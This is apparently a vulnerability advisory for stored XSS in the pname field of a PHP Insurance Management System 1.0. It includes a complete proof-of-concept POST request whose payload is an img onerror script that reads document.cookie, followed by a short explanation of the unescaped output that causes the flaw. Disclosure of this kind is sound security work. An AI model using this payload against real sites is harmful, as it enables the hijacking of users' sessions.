## Affected version: 
Insurance Management System - 1.0

## Vendor:
https://www.sourcecodester.com/users/munyweki

## Software:
https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html

## Vulnerability File:
/E-Insurance/Script/admin/core/update_policy

## Description:
There is a stored XSS vulnerability in the insurance management system. There is XSS in the pname parameter of the system. An attacker can obtain sensitive information of the system through this vulnerability.

Status: CRITICAL

POC
```
POST /E-Insurance/Script/admin/core/update_policy HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Origin: http://localhost
Connection: close
Referer: http://localhost/E-Insurance/Script/admin/?page=policy
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

category=7&subcategory=13&pname=%3Cimg+Src%3D1+Onerror%3Dalert%28document.cookie%29%3E&sum_ass=-3&premium=2&tenure=2&status=1&submit=1&id=5
```

<img width="1295" alt="image" src="https://github.com/user-attachments/assets/dd103032-0729-4c78-beca-6446fc43aaaa">

<img width="1612" alt="image" src="https://github.com/user-attachments/assets/53ac0c9a-296d-4eb8-91bc-2695c6e76db2">

## code analysis:

First insert the results into the database and use echo on the front end to output, resulting in stored XSS.

<img width="1180" alt="image" src="https://github.com/user-attachments/assets/94bcaa17-be86-464a-a652-ccfd31de8442">


<img width="1187" alt="image" src="https://github.com/user-attachments/assets/b1477e7b-98f6-4c08-92cc-7765152b31eb">



 
